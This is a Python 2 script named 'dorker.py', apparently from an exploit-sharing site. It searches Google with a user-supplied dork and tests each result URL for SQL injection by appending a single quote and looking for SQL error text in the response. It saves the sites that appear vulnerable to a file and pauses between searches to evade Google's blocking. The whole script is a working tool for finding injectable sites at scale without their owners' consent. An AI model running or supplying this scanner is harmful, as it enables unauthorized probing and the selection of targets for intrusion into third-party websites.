from xgoogle.search import GoogleSearch, SearchError
import time, urllib2, optparse
 
print '''
________                __                   
\______ \   ___________|  | __  ____ _______ 
|    |  \ /  _ \_  __ \  |/ /_/ __ \\_  __ \
|    `   (  <_> )  | \/    < \  ___/ |  | \/
/_______  /\____/|__|  |__|_ \ \___  >|__|   
        \/                  \/     \/        
---------------------------------------------------------------------------------
-- dorker.py                                                                   --
-- SQL Dork finder script                                                      --
-- Author: Xinapse                                                             --
-- Website: http://www.iexploit.org                                            --
-- Email: iexploittube@gmail.com                                               --
-- Twitter: #iExploitXinapse                                                   --
-- Version 0.0.1                                                               --
-- Usage dorker.py [options]                                                   --
---------------------------------------------------------------------------------
'''
parser = optparse.OptionParser()
options = optparse.OptionGroup(parser, 'Options')
parser.add_option('-d', '--dork', action='store', type='string', help='Dork to Scan', metavar='DORK')
parser.add_option('-f', '--file', action='store', type='string', help='Filename to save', metavar='FILE')
parser.add_option('-v', '--verbose', action="store_true", dest="verbose", default=False, help="Adds extra status messages showing program execution")
parser.add_option('-e', '--evasion', action='store', type='string', help='How long to sleep between each google request, used to prevent google blocking your IP for too many requests, recommended at least 5+, default 10', metavar='EVASION')
(opts, args) = parser.parse_args()
urlno = 0
invuln = 0
if opts.dork:
    dork = opts.dork
else:
    print '>> Please enter a dork'
if opts.file:
    filename = opts.file
else:
    print '>> Please enter a filename'
if opts.verbose:
    verbose = 'true'
else:
    verbose = 'false'
if opts.evasion:
    evas = opts.evasion
else:
    evas = 10
pagecount = 0
counter = 0
try:
    pagecount = pagecount + 1
    if verbose == 'true':
        print '>> Crawling google page ' + str(pagecount) + '...'
     
    search = GoogleSearch(dork)
     
     
     
     
    while True:
        search.results_per_page=100
        tmp = search.get_results()
         
        if not tmp:
            break
            if verbose == 'true':
                print '>> No more results...'
         
                 
        for t in tmp:
            try:
                 
                url = t.url.encode("utf8")
                if verbose == 'true':
                    print '>> Testing ' + url + ' for vulnerabilities...'
                testurl = url + "'"
                req = urllib2.urlopen(testurl)
                data = req.read()
                if "sql" in data or "SQL" in data or "MySQL" in data or "MYSQL" in data or "MSSQL" in data:
                    f = open (filename, "a")
                    if verbose == 'true':
                        print ">> Found possible injection in " + url
                    f.write(testurl + "\n")
                    f.close()
                    counter = counter + 1
                else:
                    invuln = invuln + 1
            except:
                errors = 1
        if verbose == 'true':
            print '>> Sleeping to bypass google flood protection...'       
        time.sleep(evas)
 
 
except SearchError, e:
    print ">> Search failed: %s" % e
 
 
print '>> Dorker scan ended'
print '>> ' + str(counter) + ' vulnerable sites found'
print '>> ' + str(invuln) + ' sites not vulnerable'
print '>> Thank you for using Dorker, output has been saved to ' + filename
